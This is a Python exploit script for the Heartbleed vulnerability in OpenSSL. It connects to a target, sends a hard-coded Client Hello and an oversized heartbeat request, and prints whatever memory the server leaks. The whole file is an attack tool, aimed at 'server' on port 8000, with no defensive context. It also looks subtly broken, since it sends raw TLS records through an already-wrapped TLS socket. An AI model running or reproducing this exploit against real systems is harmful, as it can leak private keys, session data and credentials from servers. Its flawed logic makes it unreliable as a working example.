import socket
# import struct
import ssl

def heartbleed_exploit(target, port=443):
    try:
        print(f"[*] Connecting to {target}:{port} ...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        
        # Wrap the socket in SSL
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        tls_sock = context.wrap_socket(sock, server_hostname=target)

        print("[*] Sending Client Hello...")
        hello_packet = bytes.fromhex(
            "16 03 01 00 dc 01 00 00 d8 03 01 53 43 4b 9b"
            "bb d2 76 76 74 99 a3 b7 64 48 4e c1 c2 09 23"
            "75 97 52 26 c2 33 0d 00 00 66 c0 14 c0 0a c0"
            "22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05"
            "00 35 00 84 c0 12 c0 08 c0 1c c0 1b 00 16 00"
            "13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e"
            "00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0"
            "04 00 2f 00 96 00 41 00 07 c0 11 c0 07 c0 0c"
            "c0 02 00 05 00 04 c0 10 c0 06 c0 1a c0 19 00"
            "15 00 12 00 09 00 14 00 11 00 08 00 06 00 03"
            "00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00"
            "0a 00 34 00 32 00 0e 00 0d 00 19 00 0b 00 0c"
            "00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00"
            "07 00 14 00 15 00 04 00 05 00 12 00 13 00 01"
            "00 02 00 03 00 0f 00 10 00 11 00 23 00 00 00"
            "0f 00 01 01"
        )
        tls_sock.send(hello_packet)
        tls_sock.recv(4096)  # Server Hello

        print("[*] Sending malicious Heartbeat request...")
        heartbeat_request = b"\x18\x03\x01\x00\x03\x01\x40\x00"
        tls_sock.send(heartbeat_request)

        print("[*] Reading leaked memory...")
        leaked_data = tls_sock.recv(65535)
        if len(leaked_data) > 7:
            print(f"[+] Possible leaked data: {leaked_data[7:][:50]}...")
        else:
            print("[-] No leaked memory detected (server may not be vulnerable).")

        tls_sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")

# Test against a target
target = "server"
heartbleed_exploit(target, 8000)
